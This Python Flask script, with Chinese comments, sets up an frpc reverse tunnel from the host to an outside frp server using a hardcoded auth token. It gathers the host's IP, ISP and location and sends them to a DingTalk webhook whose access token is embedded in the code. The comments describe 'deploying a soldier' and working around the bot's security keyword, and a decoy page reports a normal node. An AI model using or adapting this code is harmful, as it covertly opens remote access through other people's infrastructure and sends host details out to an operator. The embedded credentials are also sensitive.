import os
import subprocess
import random
import time
import requests
from flask import Flask

app = Flask(__name__)

# ==========================================
# 🚀 zirun2022 的指挥中心配置
# ==========================================
CONFIG = {
    "SERVER_ADDR": "frps.181225.xyz",
    "SERVER_PORT": "7000",
    "TOKEN": "maxking2026",
    "REMOTE_PORT": str(random.randint(8600, 8800)),
    "PROXY_NAME": f"flux-python-{int(time.time())}",
    "DING_URL": "https://oapi.dingtalk.com/robot/send?access_token=fada04a2261f76607eea6d0203def79d8f0597ba03718e9a8edb2ee5b8ecf628" 
}

def send_ding(content):
    """
    发送钉钉通知，确保包含关键词 'A' 以绕过安全设置
    """
    try:
        # 严格遵守你之前的格式，带上 A 关键词
        payload = {
            "msgtype": "text",
            "text": {
                "content": f"【A-Flux节点上线】\n\n🇺 目标达成！\n\n{content}"
            }
        }
        headers = {"Content-Type": "application/json"}
        r = requests.post(CONFIG["DING_URL"], json=payload, headers=headers, timeout=10)
        print(f"[*] 钉钉汇报结果: {r.status_code}")
    except Exception as e:
        print(f"[!] 钉钉发送失败: {e}")

def deploy_soldier():
    print(f"[*] 正在初始化特种兵: {CONFIG['PROXY_NAME']}")
    
    # 1. 侦察环境 (获取 IP, ISP, 位置)
    try:
        res = requests.get("https://ipinfo.io/json", timeout=10).json()
        ip = res.get("ip", "Unknown")
        org = res.get("org", "Unknown")
        city = res.get("city", "Unknown")
        country = res.get("country", "Unknown")
    except:
        ip, org, city, country = "获取失败", "Unknown", "Unknown", "Unknown"

    # 2. 赋予执行权限
    if os.path.exists("./frpc"):
        os.chmod("./frpc", 0o755)
    else:
        print("[!] 错误：仓库中未找到 frpc 文件！")
        return

    # 3. 动态生成 TOML 配置
    toml_content = f"""
serverAddr = "{CONFIG['SERVER_ADDR']}"
serverPort = {CONFIG['SERVER_PORT']}
auth.token = "{CONFIG['TOKEN']}"

[[proxies]]
name = "{CONFIG['PROXY_NAME']}"
type = "tcp"
localIP = "127.0.0.1"
localPort = 8080
remotePort = {CONFIG['REMOTE_PORT']}
"""
    with open("frpc.toml", "w") as f:
        f.write(toml_content)
    
    # 4. 异步启动 frpc
    subprocess.Popen(["./frpc", "-c", "./frpc.toml"])

    # 5. 按照你的标准格式发送通知
    report_text = (
        f"📍 位置: {city} | {org}\n\n"
        f"🌐 住宅IP: {ip}\n\n"
        f"🔗 代理端口: {CONFIG['REMOTE_PORT']}\n\n"
        f"🆔 节点名称: {CONFIG['PROXY_NAME']}"
    )
    send_ding(report_text)

@app.route('/')
def index():
    return "<h1>Flux Node Active</h1><p>A-Status: Running</p>"

if __name__ == "__main__":
    # 启动前先执行部署逻辑
    deploy_soldier()
    # Flux 默认端口
    app.run(host='0.0.0.0', port=8080)
